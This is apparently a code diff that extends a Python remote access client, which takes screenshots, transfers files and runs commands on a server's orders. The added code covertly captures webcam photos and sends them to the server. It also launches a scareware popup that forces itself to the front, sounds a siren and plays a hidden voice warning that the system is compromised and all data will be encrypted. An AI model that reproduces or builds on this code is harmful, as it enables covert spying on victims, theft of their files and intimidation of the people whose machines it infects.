@@ -6,6 +6,7 @@ import json
 import base64
 import platform
 import sys
+import threading
 
 # Auto-install required libraries
 def install_package(package, import_name=None):
@@ -188,6 +189,84 @@ def take_screenshot():
             "message": f"Screenshot failed: {str(e)}"
         })
 
+def capture_webcam():
+    """Capture webcam photo — tries OpenCV first, then fallback."""
+    try:
+        import io
+        frame_captured = False
+        img_data = None
+
+        # ── Method 1: OpenCV (best quality) ───────────────────────────────────
+        try:
+            import cv2
+            cap = cv2.VideoCapture(0)   # 0 = default camera
+            if not cap.isOpened():
+                # Try camera index 1 (external webcam)
+                cap = cv2.VideoCapture(1)
+            if cap.isOpened():
+                cap.set(cv2.CAP_PROP_FRAME_WIDTH,  1280)
+                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+                cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
+                # Warm-up frames (camera needs a moment to adjust exposure)
+                for _ in range(5):
+                    cap.read()
+                ret, frame = cap.read()
+                cap.release()
+                if ret and frame is not None:
+                    from PIL import Image
+                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    pil_img   = Image.fromarray(frame_rgb)
+                    buf = io.BytesIO()
+                    pil_img.save(buf, format='JPEG', quality=90, optimize=True)
+                    img_data = base64.b64encode(buf.getvalue()).decode()
+                    w, h = pil_img.size
+                    frame_captured = True
+        except ImportError:
+            pass  # cv2 not installed, try fallback
+
+        # ── Method 2: Windows DirectShow via PIL (fallback) ───────────────────
+        if not frame_captured and os_name == "Windows":
+            try:
+                import subprocess, tempfile, os as _os
+                tmp = tempfile.mktemp(suffix=".jpg")
+                # Use PowerShell + Windows Camera API
+                ps_cmd = (
+                    f"Add-Type -AssemblyName System.Windows.Forms; "
+                    f"$cam = [Windows.Media.Capture.MediaCapture]::new(); "
+                    f"Start-Sleep -m 500"
+                )
+                # Simpler: use ffmpeg if available
+                result = subprocess.run(
+                    ["ffmpeg", "-y", "-f", "dshow", "-i", "video=0",
+                     "-frames:v", "1", "-q:v", "2", tmp],
+                    capture_output=True, timeout=10
+                )
+                if result.returncode == 0 and _os.path.exists(tmp):
+                    with open(tmp, "rb") as f:
+                        img_data = base64.b64encode(f.read()).decode()
+                    _os.remove(tmp)
+                    w, h = 1280, 720
+                    frame_captured = True
+            except Exception:
+                pass
+
+        if not frame_captured or not img_data:
+            return json.dumps({
+                "type": "WEBCAM",
+                "status": "error",
+                "message": "No camera found or camera access denied. Install opencv-python: pip install opencv-python"
+            })
+
+        return json.dumps({
+            "type": "WEBCAM",
+            "status": "success",
+            "data": img_data,
+            "resolution": f"{w}x{h}"
+        })
+
+    except Exception as e:
+        return json.dumps({"type": "WEBCAM", "status": "error", "message": str(e)})
+
 def download_file(filepath):
     """Send file to server"""
     try:
@@ -276,13 +355,143 @@ def main_loop():
                         print("✓ Server requested client shutdown")
                         client.close()
                         print("🔴 Client terminated by server")
-                        exit(0)  # Completely exit the client process
+                        os._exit(0)  # Unconditionally and forcefully kill the client process
 
                     # Special commands
-                    if cmd == "SCREENSHOT":
+                    if cmd.startswith("POPUP:"):
+                        # Show popup message on client screen
+                        try:
+                            parts = cmd.split(":", 2)
+                            title = parts[1] if len(parts) > 1 else "Message"
+                            message = parts[2] if len(parts) > 2 else ""
+                            
+                            def show_big_popup():
+                                try:
+                                    import tkinter as tk
+                                    root = tk.Tk()
+                                    root.title(title)
+                                    
+                                    # Borderless window & transparent start
+                                    root.overrideredirect(True)
+                                    root.attributes('-topmost', True)
+                                    root.attributes('-alpha', 0.0)
+                                    
+                                    # Size and positioning
+                                    window_width = 750
+                                    window_height = 400
+                                    screen_width = root.winfo_screenwidth()
+                                    screen_height = root.winfo_screenheight()
+                                    x = int((screen_width / 2) - (window_width / 2))
+                                    y = int((screen_height / 2) - (window_height / 2))
+                                    
+                                    root.geometry(f"{window_width}x{window_height}+{x}+{y}")
+                                    root.configure(bg="#FF003C") # Neon red outer border
+                                    
+                                    # Inner container (Dark Cyberpunk Theme)
+                                    inner = tk.Frame(root, bg="#0A0A0A")
+                                    inner.pack(fill="both", expand=True, padx=4, pady=4)
+                                    
+                                    # Blinking Warning Header
+                                    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️", font=("Consolas", 22, "bold"), bg="#0A0A0A", fg="#FF003C")
+                                    alert_label.pack(pady=(30, 10))
+                                    
+                                    def blink_alert():
+                                        try:
+                                            current_fg = alert_label.cget("fg")
+                                            next_fg = "#0A0A0A" if current_fg == "#FF003C" else "#FF003C"
+                                            alert_label.config(fg=next_fg)
+                                            root.after(600, blink_alert)
+                                        except: pass
+                                    blink_alert()
+                                    
+                                    # Message Content
+                                    tk.Label(inner, text=title, font=("Consolas", 32, "bold"), bg="#0A0A0A", fg="white", wraplength=650).pack(pady=(10, 15))
+                                    tk.Label(inner, text=message, font=("Consolas", 20), bg="#0A0A0A", fg="#00FF41", wraplength=700).pack(pady=10, expand=True)
+                                    
+                                    # Cool Hover Button
+                                    def on_enter(e): btn.config(bg="#FF003C", fg="white")
+                                    def on_leave(e): btn.config(bg="#1A1A1A", fg="#FF003C")
+                                    
+                                    is_open = [True]
+                                    
+                                    def ambulance_siren_loop():
+                                        if platform.system() != "Windows": return
+                                        try:
+                                            import winsound
+                                            while is_open[0]:
+                                                if not is_open[0]: break
+                                                winsound.Beep(700, 600) # Low pitch (Do)
+                                                if not is_open[0]: break
+                                                winsound.Beep(900, 600) # High pitch (Re)
+                                        except: pass
+                                        
+                                    def scary_voice_loop():
+                                        if platform.system() != "Windows": return
+                                        try:
+                                            import subprocess
+                                            msg = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
+                                            ps_cmd = (
+                                                'powershell -Command "Add-Type -AssemblyName System.Speech; '
+                                                '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
+                                                '$synth.Rate = -2; '
+                                                f'$synth.Speak(\'{msg}\')"'
+                                            )
+                                            while is_open[0]:
+                                                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
+                                        except: pass
+                                    
+                                    threading.Thread(target=ambulance_siren_loop, daemon=True).start()
+                                    threading.Thread(target=scary_voice_loop, daemon=True).start()
+                                    
+                                    def close_popup():
+                                        is_open[0] = False
+                                        root.destroy()
+                                    
+                                    btn = tk.Button(inner, text="[ ACKNOWLEDGE ]", command=close_popup, font=("Consolas", 16, "bold"), bg="#1A1A1A", fg="#FF003C", relief="flat", activebackground="#FF003C", activeforeground="white", padx=30, pady=10)
+                                    btn.pack(pady=35)
+                                    btn.bind("<Enter>", on_enter)
+                                    btn.bind("<Leave>", on_leave)
+                                    
+                                    # Fade-in Animation
+                                    def fade_in(alpha=0.0):
+                                        try:
+                                            alpha += 0.05
+                                            if alpha <= 1.0:
+                                                root.attributes('-alpha', alpha)
+                                                root.after(30, fade_in, alpha)
+                                        except: pass
+                                        
+                                    def force_focus():
+                                        try:
+                                            root.lift()
+                                            root.attributes('-topmost', True)
+                                            root.focus_force()
+                                            root.after(500, force_focus)
+                                        except: pass
+                                        
+                                    root.after(100, fade_in)
+                                    force_focus()
+                                    
+                                    root.mainloop()
+                                except Exception as e:
+                                    # Fallback if tkinter fails
+                                    if platform.system() == "Windows":
+                                        import ctypes
+                                        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x40000 | 0x10000)
+                            
+                            threading.Thread(target=show_big_popup, daemon=True).start()
+                            
+                            output = json.dumps({"type": "POPUP", "status": "success", "message": "Popup shown"}).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "POPUP", "status": "error", "message": str(e)}).encode()
+                    
+                    elif cmd == "SCREENSHOT":
                         screenshot_in_progress = True
                         output = take_screenshot().encode()
                         screenshot_in_progress = False
+                    
+                    elif cmd == "WEBCAM":
+                        output = capture_webcam().encode()
                     
                     elif cmd.startswith("DOWNLOAD:"):
                         filepath = cmd.split(":", 1)[1].strip()
@@ -296,6 +505,56 @@ def main_loop():
                             output = upload_file(filename, data_b64).encode()
                         except Exception as e:
                             output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
+                    
+                    elif cmd.startswith("POPUP:"):
+                        try:
+                            parts = cmd.split(":", 2)
+                            if len(parts) == 3:
+                                title = parts[1].strip()
+                                msg = parts[2].strip()
+                                # Run popup in background thread so it doesn't block client
+                                def show_msg():
+                                    if os_name == "Windows":
+                                        import ctypes
+                                        ctypes.windll.user32.MessageBoxW(0, msg, title, 64)
+                                    else:
+                                        # Try Native Mac OS Dialog
+                                        if os_name == "Darwin":
+                                            import subprocess
+                                            try:
+                                                subprocess.run(["osascript", "-e", f'display dialog "{msg}" with title "{title}" buttons {{"OK"}} default button "OK"'], check=True)
+                                                return
+                                            except: pass
+                                        
+                                        # Try Native Linux Dialog
+                                        elif os_name == "Linux":
+                                            import subprocess
+                                            try:
+                                                subprocess.run(["zenity", "--info", f"--title={title}", f"--text={msg}"], check=True)
+                                                return
+                                            except:
+                                                try:
+                                                    subprocess.run(["notify-send", title, msg], check=True)
+                                                    return
+                                                except: pass
+                                        
+                                        # Universal Tkinter Fallback (if native fails)
+                                        try:
+                                            import tkinter as tk
+                                            from tkinter import messagebox
+                                            r = tk.Tk()
+                                            r.withdraw()
+                                            r.attributes('-topmost', True)
+                                            messagebox.showinfo(title, msg)
+                                            r.destroy()
+                                        except:
+                                            pass
+                                threading.Thread(target=show_msg, daemon=True).start()
+                                output = json.dumps({"type": "POPUP", "status": "success", "message": "Popup displayed!"}).encode()
+                            else:
+                                output = json.dumps({"type": "POPUP", "status": "error", "message": "Invalid popup format"}).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "POPUP", "status": "error", "message": str(e)}).encode()
                     
                     elif cmd == "SYSINFO":
                         info = {
@@ -561,6 +820,13 @@ def main_loop():
                                 output = error_msg.encode()
 
                     client.send(output)
+                    
+                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM")):
+                        try:
+                            time.sleep(0.1)
+                            client.send(b"\n}")
+                        except:
+                            pass
 
                 except ConnectionResetError:
                     print("⚠️ Server disconnected")
